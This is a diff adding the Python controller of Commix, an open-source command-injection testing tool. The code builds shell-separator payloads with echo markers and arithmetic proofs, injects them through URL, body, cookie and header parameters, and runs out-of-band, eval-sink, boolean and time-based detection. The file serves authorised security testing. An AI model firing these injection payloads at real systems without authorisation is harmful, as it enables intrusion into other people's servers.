@@ -1,0 +1,2038 @@
+#!/usr/bin/env python
+# encoding: UTF-8
+
+"""
+This file is part of Commix Project (https://commixproject.com).
+Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).
+
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
+
+For more see the file 'readme/COPYING' for copying permission.
+"""
+
+import re
+import os
+import time
+import random
+import string
+import difflib
+from src.core.parse import cmdline as menu
+from src.utils import logs
+from src.utils import settings
+from src.utils import common
+from src.utils import session_handler
+from src.core.requests import headers
+from src.core.requests import requests
+from src.core.requests import parameters
+from src.core.modules import modules_handler
+from src.core.requests import authentication
+from src.core.controller import checks
+from src.thirdparty.six.moves import urllib as _urllib
+from src.core.techniques.time_based import tb_handler
+from src.core.techniques.oob import oob_handler
+from src.core.techniques.file_based import fb_handler
+from src.core.techniques.tempfile_based import tfb_handler
+from src.core.techniques.results_based import rb_handler
+from src.core.techniques.boolean_based import bb_handler
+from src.core.eval import eb_handler
+
+"""
+Command Injection and exploitation controller.
+Checks if the testable parameter is exploitable.
+"""
+
+"""
+Generate fresh operands and markers per call; match the markers around the computed value to avoid false positives.
+"""
+def basic_payload_generator():
+  rand_a = random.randint(1, 10000)
+  rand_b = random.randint(1, 10000)
+  calc_string = str(rand_a) + "+" + str(rand_b)
+  marker1 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
+  marker2 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
+  marker3 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
+
+  suffix = ""
+  if checks.using_backticks():
+    # 'expr' wants its operands as separate arguments - given one, it echoes the string back
+    # instead of adding anything up.
+    prefix = "expr "
+    calc_string = str(rand_a) + settings.SINGLE_WHITESPACE + "+" + settings.SINGLE_WHITESPACE + str(rand_b)
+  else:
+    prefix = "("
+    suffix = ")"
+
+  if settings.SKIP_CALC:
+    # '--skip-calc' covers the detection phase, and the heuristic is part of it - so what the target
+    # has to print back between the markers is a marker it had to run a command to produce.
+    expected = marker3
+    settings.BASIC_STRING = "echo " + marker3
+    windows_proof = "echo " + marker3
+    alter_interpreter_basic_string = " -c \"print('" + marker3 + "')\""
+  else:
+    expected = str(rand_a + rand_b)
+    settings.BASIC_STRING = prefix + calc_string + suffix
+    windows_proof = "set /a " + settings.BASIC_STRING
+    alter_interpreter_basic_string = " -c \"print(int(" + calc_string + "))\""
+
+  settings.BASIC_COMMAND_INJECTION_PAYLOADS = [";echo " + marker1 + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + marker2 +
+                                              "&echo " + marker1 + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + marker2 +
+                                              "|echo " + marker1 + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + marker2,
+                                              "|echo " + marker1 + "&" + windows_proof + "&echo " + marker2 +
+                                              "&echo " + marker1 + "&" + windows_proof + "&echo " + marker2
+                                              ]
+  settings.ALTER_INTERPRETER_BASIC_COMMAND_INJECTION_PAYLOADS = [";echo " + marker1 + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + alter_interpreter_basic_string + settings.CMD_SUB_SUFFIX + marker2 +
+                                              "&echo " + marker1 + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + alter_interpreter_basic_string + settings.CMD_SUB_SUFFIX + marker2 +
+                                              "|echo " + marker1 + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + alter_interpreter_basic_string + settings.CMD_SUB_SUFFIX + marker2,
+                                              "|echo " + marker1 + "&for /f \"tokens=* eol=\" %i in ('cmd /c " + settings.WIN_PYTHON_INTERPRETER + alter_interpreter_basic_string + "') do @set /p=%i" + settings.CMD_NUL + "&echo " + marker2 +
+                                              "&echo " + marker1 + "&for /f \"tokens=* eol=\" %i in ('cmd /c " + settings.WIN_PYTHON_INTERPRETER + alter_interpreter_basic_string + "') do @set /p=%i" + settings.CMD_NUL + "&echo " + marker2
+                                              ]
+  settings.BASIC_COMMAND_INJECTION_RESULT = re.escape(marker1) + r"\s*" + re.escape(expected) + r"\s*" + re.escape(marker2)
+
+"""
+Initializing basic level check status
+"""
+def basic_level_checks():
+  settings.TIME_RELATED_ATTACK = False
+  settings.SKIP_CODE_INJECTIONS = None
+  settings.SKIP_COMMAND_INJECTIONS = None
+  settings.IDENTIFIED_COMMAND_INJECTION = False
+  settings.IDENTIFIED_WARNINGS = False
+  settings.IDENTIFIED_EVAL_PROBE = False
+
+"""
+Take the state one parameter's testing leaves behind back to what it was before.
+
+What was learned about one parameter is not the next one's: a technique that answered for it, and a
+value of its own that turned out not to be needed, would otherwise still be standing when the next
+parameter is judged - and the verdict on that parameter read off them.
+"""
+def reset_parameter_state():
+  # The other technique states are put back as each technique starts; this one is reached as a
+  # fallback from the file-based technique instead, so nothing else clears it.
+  settings.TEMPFILE_BASED_STATE = False
+  # How one parameter carried its value says nothing about how the next one carries its own.
+  settings.VALUE_ENCODING = None
+  # Whether a parameter needs the value it was given is asked of that parameter alone.
+  settings.TESTABLE_VALUE_OPTIMIZED = False
+  # And what stood in for the last parameter's value says nothing about this one's, which is tested
+  # with its own until a probe of its own drops it - a finding of this parameter's written out with
+  # the last one's value in front of it names a request nobody sent.
+  settings.TESTABLE_VALUE_STOOD_IN_FOR = ""
+  # Narrowed below for one parameter at a time, and put back here so the next one is tested with
+  # the techniques the run was given rather than with what the last parameter settled on.
+  if settings.TECHNIQUES_BEFORE_NARROWING is None:
+    settings.TECHNIQUES_BEFORE_NARROWING = menu.options.tech
+  else:
+    menu.options.tech = settings.TECHNIQUES_BEFORE_NARROWING
+
+"""
+Initializing HTTP Headers parameters injection status
+"""
+def init_http_header_injection_status():
+  settings.HTTP_HEADERS_INJECTION = None
+  settings.USER_AGENT_INJECTION = None
+  settings.REFERER_INJECTION = None
+  settings.HOST_INJECTION = None
+
+"""
+Initializing Cookie parameters injection status
+"""
+def init_cookie_injection_status():
+  settings.COOKIE_INJECTION = None
+
+"""
+Check for previously stored sessions.
+"""
+def check_for_stored_sessions(url, check_parameter, http_request_method):
+  settings.STORED_TECHNIQUES = {}
+  if not menu.options.ignore_session and not menu.options.flush_session:
+    if os.path.isfile(settings.SESSION_FILE) and not settings.REQUIRED_AUTHENTICATION:
+      url, check_parameter = session_handler.check_stored_injection_points(url, check_parameter, http_request_method)
+      # Load stored techniques once so each can resume without re-querying storage.
+      settings.STORED_TECHNIQUES = session_handler.load_stored_techniques(url, check_parameter, http_request_method)
+  return url, check_parameter
+
+"""
+Heuristic request(s)
+
+Carried the way the exploitation requests carry it, pollution included: under '--smart' a negative
+answer here is what leaves the parameter untested, so deciding that on an unpolluted request would
+skip the parameter over an answer '--hpp' was given to change.
+"""
+def heuristic_request(url, http_request_method, check_parameter, payload, whitespace, place):
+  data = None
+  cookie = None
+  tmp_url = url
+  payload, prefix = parameters.prefixes(payload, prefix="")
+  payload, suffix = parameters.suffixes(payload, suffix="")
+  payload = checks.tamper_outside_single_quotes(payload, lambda part: part.replace(settings.SINGLE_WHITESPACE, whitespace))
+  if settings.IS_JSON:
+    payload = _urllib.parse.unquote(payload)
+  payload = checks.perform_payload_modification(payload)
+  # Written back the way the parameter's own value arrived, as every later request is.
+  payload = checks.apply_value_encoding(payload)
+  if settings.VERBOSITY_LEVEL >= 1:
+    settings.print_data_to_stdout(settings.print_payload(payload))
+  if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
+    payload = checks.payload_fixation(payload)
+    # Percent-encode cookie values to safely handle delimiters and special characters.
+    encoded_payload = checks.encode_payload(payload)
+    cookie = checks.process_injectable_value(encoded_payload, menu.options.cookie).encode(settings.DEFAULT_CODEC)
+  else:
+    cookie = checks.remove_tags(menu.options.cookie).encode(settings.DEFAULT_CODEC)
+
+  if not settings.IGNORE_USER_DEFINED_POST_DATA and menu.options.data and settings.INJECT_TAG in menu.options.data:
+    # A structured body escapes for itself; a form-encoded one needs the payload encoded for it.
+    if settings.IS_JSON:
+      body_payload = payload
+    elif settings.IS_GRAPHQL:
+      body_payload = checks.graphql_escape_payload(payload)
+    elif settings.IS_XML:
+      body_payload = checks.xml_encode_payload(checks.strip_xml_forbidden(payload))
+    else:
+      body_payload = checks.encode_payload(payload)
+    data = checks.restore_xml_layout(checks.process_injectable_value(body_payload, menu.options.data, pollute=True)).encode(settings.DEFAULT_CODEC)
+  else:
+    if settings.USER_DEFINED_POST_DATA:
+      settings.USER_DEFINED_POST_DATA = checks.remove_tags(settings.USER_DEFINED_POST_DATA)
+      data = settings.USER_DEFINED_POST_DATA.encode(settings.DEFAULT_CODEC)
+  if settings.INJECT_TAG in url:
+    # Encode query string, preserving delimiters and configured parameter delimiter
+    encoded_payload = checks.encode_payload(payload)
+    tmp_url = checks.process_injectable_value(encoded_payload, url, pollute=True)
+  else:
+    tmp_url = checks.remove_tags(tmp_url)
+    url = checks.remove_tags(url)
+
+  request = _urllib.request.Request(tmp_url, data, method=http_request_method)
+  if cookie:
+    request.add_header(settings.COOKIE, cookie)
+  # The payload is carried by the header itself here - 'headers.do_check' leaves the header alone
+  # while its injection flag is set, so that this is the only value it is given.
+  if check_parameter_in_http_header(check_parameter, place):
+    settings.CUSTOM_HEADER_NAME = check_parameter.title()
+    if settings.INJECT_TAG in settings.CUSTOM_HEADER_VALUE:
+      # The payload goes where the marker is, so whatever static text the header carries stays with
+      # it - searched for the value as it stood, the marker having just been taken out of it, the
+      # replacement matched nothing and the header went out carrying no payload at all.
+      request.add_header(settings.CUSTOM_HEADER_NAME, settings.CUSTOM_HEADER_VALUE.replace(settings.INJECT_TAG, payload).encode(settings.DEFAULT_CODEC))
+    else:
+      request.add_header(settings.CUSTOM_HEADER_NAME, payload.encode(settings.DEFAULT_CODEC))
+  headers.do_check(request)
+  response = requests.get_request_response(request)
+  return response, url
+
+"""
+Announce what the heuristic found. One wording for every channel it can come back over, and for
+either sink - which technique answered is the technique's business, not something to commit to
+while still guessing. All the heuristic is entitled to add is what it happened to learn on the way,
+which goes in the parenthesis its caller hands over.
+"""
+def announce_heuristic_finding(detail):
+  info_msg = "Heuristic (basic) test shows that "
+  info_msg += settings.CHECKING_PARAMETER + " might be injectable (" + detail + ")."
+  settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
+
+"""
+Heuristic (basic) test for command injection
+"""
+"""
+Whether the parameter's own value is needed to reach the sink, asked while the heuristic still holds
+the payload that reached it.
+
+The value belongs to the target, and what the target does with it is what takes the time: an address
+it pings answers in seconds where one it cannot resolve answers at once, and a scan sends hundreds of
+requests before it is finished. The same question asked twice, once with the value and once with a
+short random one, says whether any of that waiting buys anything.
+
+Asked here rather than once a technique is confirmed, which is where it was asked before: by then the
+heuristics, every boundary and the whole timing model have been paid for at the slow value's price,
+and only what came after could be made cheap.
+
+Nothing is assumed from it. The value is dropped only where the same marker comes back without it,
+the sink having demonstrably run either way - and where the pass that follows confirms nothing at
+all, the value is put back and the pass is made again, so no sink is lost to an optimisation.
+"""
+def probe_skip_testable_value_early(url, http_request_method, check_parameter, payload, whitespace, place):
+  if settings.TESTABLE_VALUE_OPTIMIZED or not settings.TESTABLE_VALUE or settings.VALUE_SKIP_REFUSED:
+    return url
+  marker = settings.TESTABLE_VALUE + settings.INJECT_TAG
+  in_data = bool(menu.options.data) and marker in menu.options.data
+  in_url = marker in url
+  if not in_data and not in_url:
+    return url
+  placeholder = ''.join(random.choice(string.ascii_uppercase) for _ in range(3))
+  original_data, original_url, original_value = menu.options.data, url, settings.TESTABLE_VALUE
+  if in_data:
+    menu.options.data = menu.options.data.replace(marker, placeholder + settings.INJECT_TAG)
+  else:
+    url = url.replace(marker, placeholder + settings.INJECT_TAG)
+  settings.TESTABLE_VALUE = placeholder
+  answered = False
+  try:
+    response, _ = heuristic_request(url, http_request_method, check_parameter, payload, whitespace, place)
+    if type(response) is not bool and response is not None:
+      html_data = checks.process_page_content(response, action="decode")
+      answered = bool(re.search(settings.BASIC_COMMAND_INJECTION_RESULT, html_data))
+  except Exception:
+    answered = False
+  if not answered:
+    menu.options.data = original_data
+    settings.TESTABLE_VALUE = original_value
+    return original_url
+  settings.TESTABLE_VALUE_OPTIMIZED = True
+  settings.TESTABLE_VALUE_STOOD_IN_FOR = original_value
+  settings.VALUE_SKIPPED_EARLY = (original_value, placeholder, original_url, original_data)
+  # Not recorded in the session here: what the sink answered is not yet what a technique confirmed,
+  # and a stand-in this run goes on to refuse would be left for the next one to replay.
+  if settings.VERBOSITY_LEVEL != 0:
+    debug_msg = "The parameter's own value is not required to reach the sink, so it is skipped for faster requests."
+    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+  return url
+
+def command_injection_heuristic_basic(url, http_request_method, check_parameter, place):
+  check_parameter = check_parameter.lstrip().rstrip()
+  checks.perform_payload_modification(payload="")
+  basic_payload_generator()
+  if menu.options.interpreter:
+    basic_payloads = settings.ALTER_INTERPRETER_BASIC_COMMAND_INJECTION_PAYLOADS
+  else:
+    basic_payloads = settings.BASIC_COMMAND_INJECTION_PAYLOADS
+
+  basic_payloads = [x.replace(settings.RANDOM_STRING_GENERATOR, settings.SINGLE_WHITESPACE.strip()) for x in basic_payloads]
+
+  """
+  One shape per shell, and only the shape worth sending.
+
+  The two payloads are the same question asked in each shell's own syntax, so which of them answers
+  is what names the shell. Where the operating system is already known - the banner said so, or
+  '--os' did - the other shape cannot execute, and sending it only doubles the requests.
+  """
+  shaped = list(zip(basic_payloads, ("Unix-like", "Windows")))
+  if settings.IDENTIFIED_TARGET_OS or menu.options.os:
+    wanted = "Windows" if settings.TARGET_OS == settings.OS.WINDOWS else "Unix-like"
+    shaped = [pair for pair in shaped if pair[1] == wanted] or shaped
+
+  settings.RESULTS_BASED_STATE = True
+  try:
+    for whitespace in settings.WHITESPACES:
+      if not settings.IDENTIFIED_COMMAND_INJECTION:
+        for payload, shell_os in shaped:
+          response, url = heuristic_request(url, http_request_method, check_parameter, payload, whitespace, place)
+          if type(response) is not bool and response is not None:
+            html_data = checks.process_page_content(response, action="decode")
+            match = re.search(settings.BASIC_COMMAND_INJECTION_RESULT, html_data)
+            if match:
+              settings.IDENTIFIED_COMMAND_INJECTION = True
+              # Asked while the payload that answered is still in hand, and before a technique has
+              # spent a single request at the slow value's price.
+              url = probe_skip_testable_value_early(url, http_request_method, check_parameter, payload, whitespace, place)
+              # The token the rest of the code compares against, and then what was really shown.
+              checks.set_target_os(shell_os)
+              # A payload that ran answers what the banner could not, so nothing need be asked.
+              settings.OS_IDENTIFICATION_PENDING = False
+              announce_heuristic_finding("identified command shell type: '" + checks.target_shell_label() + "'")
+              # A shell answering here says nothing about whether a string is also evaluated as
+              # code, so it settles the question only where the code injection sink was not asked
+              # for by name - otherwise every technique carrying it would skip itself, and the run
+              # would report "not injectable" without having sent one of their payloads.
+              if not menu.options.eval_sink:
+                settings.SKIP_CODE_INJECTIONS = True
+              elif not settings.COMMAND_SUGGESTED:
+                settings.COMMAND_SUGGESTED = True
+                """
+                '--eval' names code injection, and naming it is what stops command injection from
+                being tested at all - so a shell answering here would otherwise be found, reported
+                and then left behind, with the run going on to look only for what it was told to.
+
+                The option the user gave still wins by default: what is offered is dropping it,
+                and a run that is not being watched keeps the option it was started with.
+                """
+                message = "The target answers as a command shell, so it is open to command injection as well. "
+                message += "Do you want to test for that instead (i.e. without the '--eval' option)? [y/N] "
+                if common.read_input(message, default="N", check_batch=True) in settings.CHOICE_YES:
+                  menu.options.eval_sink = False
+                  settings.SKIP_CODE_INJECTIONS = True
+              break
+
+    settings.RESULTS_BASED_STATE = False
+    return url
+
+  except (_urllib.error.URLError, _urllib.error.HTTPError) as err_msg:
+    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+    raise SystemExit(settings.EXIT_FAILURE)
+
+"""
+Heuristic (basic) test over the out-of-band channel.
+
+The results-based test reads the sum back out of the response, so it is blind to exactly the points
+'--oob' exists for. Without this, such a parameter is reported as probably not injectable - and with
+'--smart' it would be skipped outright.
+"""
+def oob_heuristic_basic(url, http_request_method, check_parameter, place):
+  from src.core.techniques.oob import oob_payloads as oob_payloads
+
+  channel = checks.init_oob_channel()
+  if channel is None:
+    return url
+
+  # Both, unless the results-based test already settled which one it is - or the user has said so
+  # with '--os', which no heuristic of ours gets to overrule.
+  target_systems = (settings.OS.UNIX, settings.OS.WINDOWS)
+  if settings.IDENTIFIED_COMMAND_INJECTION or menu.options.os:
+    target_systems = (settings.TARGET_OS,)
+
+  # Said once, because these payloads break the rule the tested ones keep to: they chain several
+  # separators and clients into one request, to spend one request rather than six on a yes/no.
+  if settings.VERBOSITY_LEVEL != 0:
+    debug_msg = "Chaining all separators and clients into a single heuristic request."
+    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+
+  attempts = []
+  for target_os in target_systems:
+    payload, probes = oob_payloads.heuristic_payload(channel, target_os)
+    if settings.VERBOSITY_LEVEL != 0:
+      settings.print_data_to_stdout(settings.print_payload(payload))
+    heuristic_request(url, http_request_method, check_parameter, payload, settings.WHITESPACES[0], place)
+    attempts.append((target_os, probes))
+
+  # A name lookup beats an HTTPS round trip almost every time, so the client that answers first is
+  # nearly always the one least worth leading with. Once only a lookup has landed, hold the window
+  # open a little longer for an HTTP client rather than settling on the spot.
+  def _http_first():
+    best = None
+    for target_os, probes in attempts:
+      for token, transport in probes:
+        if not channel.seen(token, protocol=oob_payloads.required_protocol(transport)):
+          continue
+        if oob_payloads.required_protocol(transport) == "http":
+          return (target_os, transport)
+        if best is None:
+          best = (target_os, transport)
+    return best
+
+  channel.poll_now()
+  answered = None
+  deadline = time.time() + settings.OOB_TIMEOUT
+  while time.time() < deadline:
+    answered = _http_first()
+    if answered is not None:
+      if oob_payloads.required_protocol(answered[1]) == "http":
+        break
+      # Only a lookup so far - give an HTTP client a brief grace period to follow it in.
+      deadline = min(deadline, time.time() + settings.OOB_HTTP_GRACE)
+    # Asked for every round: the idle interval would hold the answer back for seconds after it lands.
+    channel.poll_now()
+    time.sleep(settings.OOB_WAIT_POLL_INTERVAL)
+
+  if answered is None:
+    return url
+
+  target_os, transport = answered
+  # The lookup came back, so the payload around it ran - and any HTTP client in that same payload
+  # has already had its chance on a boundary that works. Naming them here keeps the sweep from
+  # asking them again on every boundary it tries.
+  if oob_payloads.required_protocol(transport) == "dns":
+    silent = [candidate for _, probes in attempts for token, candidate in probes
+              if oob_payloads.required_protocol(candidate) == "http" and not channel.seen(token, protocol="http")]
+    settings.OOB_HEURISTIC_HTTP_SILENT = list(dict.fromkeys(silent))
+  # Already identified means the results-based test got there first, so the interaction is not
+  # news - which client the target answered on still is, and the sweep leads with it.
+  already_identified = settings.IDENTIFIED_COMMAND_INJECTION
+  settings.IDENTIFIED_COMMAND_INJECTION = True
+  settings.OOB_HEURISTIC_TRANSPORT = transport
+  # A shell reaching out says nothing about whether a string is also evaluated as code, so it
+  # settles the question only where the code injection sink was not asked for by name - the
+  # technique carrying that sink reads this flag, and would otherwise skip itself over an answer
+  # given in the shell's own language, the way the results-based heuristic above already guards.
+  if not menu.options.eval_sink:
+    settings.SKIP_CODE_INJECTIONS = True
+  if already_identified:
+    if settings.VERBOSITY_LEVEL != 0:
+      debug_msg = "The target answered out-of-band over '" + transport + "'."
+      settings.print_data_to_stdout(settings.print_bold_debug_msg(debug_msg))
+    return url
+  # Settled only where the client that answered belongs to one of them: a shared one says the
+  # command ran, not which shell ran it, and the sweep is better off still asking than led by a
+  # guess it would then build every payload on.
+  if not menu.options.os and oob_payloads.transport_identifies_os(transport):
+    settings.TARGET_OS = target_os
+    announce_heuristic_finding("identified command shell type: '" + checks.target_shell_label() + "'")
+  else:
+    announce_heuristic_finding("answered out-of-band over '" + transport + "'")
+  return url
+
+"""
+Heuristic (basic) test for code injection warnings
+"""
+def code_injections_heuristic_basic(url, http_request_method, check_parameter, place):
+  check_parameter = check_parameter.lstrip().rstrip()
+  # What the probe answered with. A complaint from the interpreter names the language without
+  # naming a version, so the language is all there is to report in that case.
+  detail = "identified evaluated language: '" + settings.EVAL_GRAMMAR.LABEL + "'"
+  settings.EVAL_BASED_STATE = True
+  # A command-only tamper (e.g. 'printfoctal') was still compatible the last time dependencies were
+  # checked, before this probe's own eval syntax made it not - re-checked now, or it would corrupt
+  # these payloads into something no language reads back the way the probe needs.
+  if menu.options.tamper:
+    checks.tamper_scripts(stored_tamper_scripts=True)
+  try:
+    whitespace = settings.SINGLE_WHITESPACE
+    if (not settings.IDENTIFIED_WARNINGS and not settings.IDENTIFIED_EVAL_PROBE):
+      """
+      A complaint is worth less than a version, so one does not end the search.
+
+      Which boundary reaches the sink is what the sweep is for, and the ones that miss tend to make
+      the interpreter complain - so stopping at the first complaint reports the language and never
+      learns the version a later boundary would have answered with. A version ends it; a complaint
+      is remembered and the rest are tried.
+      """
+      """
+      Where no language was named, each supported one is probed with its own payloads.
+
+      Nothing about the target says which language is evaluating the string, and a probe written for
+      one of them means nothing to another - so asking only the default answered for that language
+      and reported the parameter as not injectable for every other.
+
+      Whichever language answers is left in force, so the techniques that follow speak the one the
+      heuristic found rather than starting the search over.
+      """
+      if not menu.options.eval_sink or menu.options.eval_sink == settings.EVAL_ALL_LANGUAGES:
+        languages = settings.SUPPORTED_EVAL_LANGUAGES
+        # Whichever the target named for itself goes first - the others still follow, since a
+        # header says what runs the page, not what evaluates a string inside it.
+        if settings.IDENTIFIED_EVAL_LANGUAGE in languages:
+          languages = (settings.IDENTIFIED_EVAL_LANGUAGE,) + tuple(
+            _ for _ in languages if _ != settings.IDENTIFIED_EVAL_LANGUAGE)
+      else:
+        languages = (settings.EVAL_GRAMMAR.NAME,)
+      # Which language's own probe answered. The sweep goes on past a complaint to look for a
+      # version, so the grammar left in force at the end is the last language tried rather than
+      # the one that answered, and the switch below would name that one instead.
+      answered_language = None
+      for language in languages:
+        settings.set_eval_grammar(language)
+        if len(languages) > 1 and settings.VERBOSITY_LEVEL != 0:
+          debug_msg = "Testing the '" + settings.EVAL_GRAMMAR.LABEL + "' language."
+          settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+        for payload in settings.EVAL_PROBE_PAYLOADS:
+          response, url = heuristic_request(url, http_request_method, check_parameter, payload, whitespace, place)
+          if type(response) is not bool and response is not None:
+            html_data = checks.process_page_content(response, action="decode")
+            match = re.search(settings.EVAL_PROBE_REGEX, html_data)
+            if match:
+              detail = "identified " + settings.EVAL_GRAMMAR.LABEL + " version: '" + match.group(1) + "'"
+              settings.IDENTIFIED_EVAL_PROBE = True
+              answered_language = language
+              break
+            # A plain shell error (the probe reached a shell, not an interpreter) can still contain
+            # one of these words by coincidence - 'syntax error' reads the same complaint from
+            # 'sh' as it does from Perl. Where the response is one of those, the word is the
+            # shell's, not the language's, so it is not treated as evidence of an eval sink.
+            if not checks.extract_error_message(html_data):
+              baseline = settings.ORIGINAL_PAGE or ""
+              for warning in settings.EVAL_WARNINGS:
+                # A word the page was already carrying before anything was sent to it is the page's
+                # own - prose that happens to name an error reads exactly like one reported, and a
+                # page that explains itself ('..., a syntax error - ...') says it on every response
+                # whatever the probe was. What the probe caused is what is not there to begin with.
+                if warning in html_data and warning not in baseline:
+                  settings.IDENTIFIED_WARNINGS = True
+                  answered_language = language
+                  detail = "identified evaluated language: '" + settings.EVAL_GRAMMAR.LABEL + "'"
+                  break
+        if settings.IDENTIFIED_EVAL_PROBE:
+          break
+
+      # Said once, whichever of the two the sweep came back with.
+      if settings.IDENTIFIED_WARNINGS or settings.IDENTIFIED_EVAL_PROBE:
+        # Pointed back at the language that answered, so the switch offered below and whatever runs
+        # next both speak the one the heuristic found.
+        if answered_language:
+          settings.set_eval_grammar(answered_language)
+        announce_heuristic_finding(detail)
+        # Code injection is tested only where it was asked for, so what the heuristic saw is
+        # named, the switch that would act on it is named too, and the run carries on testing
+        # for command injection either way.
+        if menu.options.eval_sink:
+          settings.SKIP_COMMAND_INJECTIONS = True
+        elif not settings.EVAL_SUGGESTED:
+          settings.EVAL_SUGGESTED = True
+          # The sweep already found which language answered, so the switch is offered naming it
+          # rather than sending the run back over every language to find it again.
+          language = settings.EVAL_GRAMMAR.NAME
+          message = "Do you want to test it for code injection (i.e. option '--eval=" + language + "')? [Y/n] "
+          if common.read_input(message, default="Y", check_batch=True) in settings.CHOICE_YES:
+            menu.options.eval_sink = language
+            settings.SKIP_COMMAND_INJECTIONS = True
+
+    settings.EVAL_BASED_STATE = False
+    # A command-only tamper dropped above for this probe's own eval syntax belongs back in play now
+    # - '--eval' was declined, or never came up, and whatever runs next is a command once again.
+    if menu.options.tamper:
+      checks.tamper_scripts(stored_tamper_scripts=True)
+    return url
+
+  except (_urllib.error.URLError, _urllib.error.HTTPError) as err_msg:
+    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+    raise SystemExit(settings.EXIT_FAILURE)
+
+"""
+Run one technique via the given exploit() callable, updating its own state flag in settings - the shared skeleton behind the 4 functions below.
+"""
+"""
+Run one attempt of an evaluation-sink technique per language.
+
+Nothing the target says identifies the language evaluating the string, so where '--eval' named none,
+each supported one is tried in turn until one answers. Where it named one, that is the only one
+tried. The grammar is left pointing at whichever language answered, so the exploitation that follows
+speaks the same one the detection did.
+"""
+def _run_over_languages(exploit):
+  if menu.options.eval_sink != settings.EVAL_ALL_LANGUAGES:
+    return exploit() is not False
+  """
+  A language the heuristic already recognised is the only one tried.
+
+  Its probe came back with that language's own version, which is as much as a sweep here could
+  establish - and every language tried and rejected costs a full delay on the time-based technique.
+  """
+  if settings.IDENTIFIED_EVAL_PROBE:
+    return exploit() is not False
+  languages = settings.SUPPORTED_EVAL_LANGUAGES
+  # Whichever the target named for itself goes first - the others still follow, since a header
+  # says what runs the page, not what evaluates a string inside it.
+  if settings.IDENTIFIED_EVAL_LANGUAGE in languages:
+    languages = (settings.IDENTIFIED_EVAL_LANGUAGE,) + tuple(
+      _ for _ in languages if _ != settings.IDENTIFIED_EVAL_LANGUAGE)
+  for language in languages:
+    settings.set_eval_grammar(language)
+    if len(languages) > 1 and settings.VERBOSITY_LEVEL != 0:
+      debug_msg = "Testing the '" + settings.EVAL_GRAMMAR.LABEL + "' language."
+      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+    if exploit() is not False:
+      return True
+  return False
+
+# Run one technique, and say it was skipped where it did not run.
+def run_technique(injection_type, technique, state_name, skip_flag_name, tech_letter, exploit, eval_sink=False):
+  setattr(settings, state_name, None)
+  if not getattr(settings, skip_flag_name):
+    if checks.technique_selected(tech_letter, eval_sink):
+      setattr(settings, state_name, _run_over_languages(exploit) if eval_sink else exploit() is not False)
+  state = getattr(settings, state_name)
+  if state == None or getattr(settings, skip_flag_name):
+    checks.skipping_technique(technique, injection_type, state)
+
+"""
+Check if it's exploitable via classic command injection technique.
+"""
+def results_based_command_injection_technique(url, timesec, filename, http_request_method):
+  injection_type = settings.INJECTION_TYPE.RESULTS_BASED_CI
+  technique = settings.INJECTION_TECHNIQUE.RESULTS_BASED
+  # Prove the injection by what the response carries back.
+  def exploit():
+    result = rb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)
+    if result is not False:
+      settings.IDENTIFIED_COMMAND_INJECTION = True
+      settings.SKIP_CODE_INJECTIONS = True
+    return result
+  run_technique(injection_type, technique, "RESULTS_BASED_STATE", "SKIP_COMMAND_INJECTIONS", "r", exploit)
+
+"""
+Check if it's exploitable via dynamic code evaluation technique.
+"""
+def dynamic_code_evaluation_technique(url, timesec, filename, http_request_method):
+  injection_type = settings.INJECTION_TYPE.RESULTS_BASED_CE
+  technique = settings.INJECTION_TECHNIQUE.DYNAMIC_CODE
+  # Prove the code injection by what the response carries back.
+  def exploit():
+    result = eb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)
+    if result is not False:
+      settings.SKIP_COMMAND_INJECTIONS = True
+    return result
+  run_technique(injection_type, technique, "EVAL_BASED_STATE", "SKIP_CODE_INJECTIONS", "r", exploit, eval_sink=True)
+
+"""
+Check if it's exploitable via boolean-based blind command injection technique.
+"""
+def boolean_based_technique(url, timesec, filename, http_request_method):
+  # The branch proves execution either way - what the sink changes is only whether the command the
+  # target branches on is written in the shell's language or in the one it evaluates.
+  eval_sink = bool(menu.options.eval_sink)
+  injection_type = settings.INJECTION_TYPE.BLIND_CE if eval_sink else settings.INJECTION_TYPE.BLIND
+  technique = settings.INJECTION_TECHNIQUE.BOOLEAN_BASED
+  # Prove the injection by what the page says, where the target branches on the command it ran.
+  def exploit():
+    result = bb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)
+    if result is not False and not eval_sink:
+      settings.IDENTIFIED_COMMAND_INJECTION = True
+    return result
+  run_technique(injection_type, technique, "BOOLEAN_BASED_STATE",
+                "SKIP_CODE_INJECTIONS" if eval_sink else "SKIP_COMMAND_INJECTIONS", "b", exploit, eval_sink=eval_sink)
+
+"""
+Check if it's exploitable via time-based command injection technique.
+"""
+def timebased_technique(url, timesec, filename, http_request_method, url_time_response):
+  # The delay proves execution either way - what the sink changes is only whether the payload is
+  # written in the shell's language or in the one the target evaluates.
+  eval_sink = bool(menu.options.eval_sink)
+  injection_type = settings.INJECTION_TYPE.BLIND_CE if eval_sink else settings.INJECTION_TYPE.BLIND
+  technique = settings.INJECTION_TECHNIQUE.TIME_BASED
+  # Prove the injection by how long the target takes to answer.
+  def exploit():
+    result = tb_handler.exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique)
+    if result is not False and not eval_sink:
+      settings.IDENTIFIED_COMMAND_INJECTION = True
+    return result
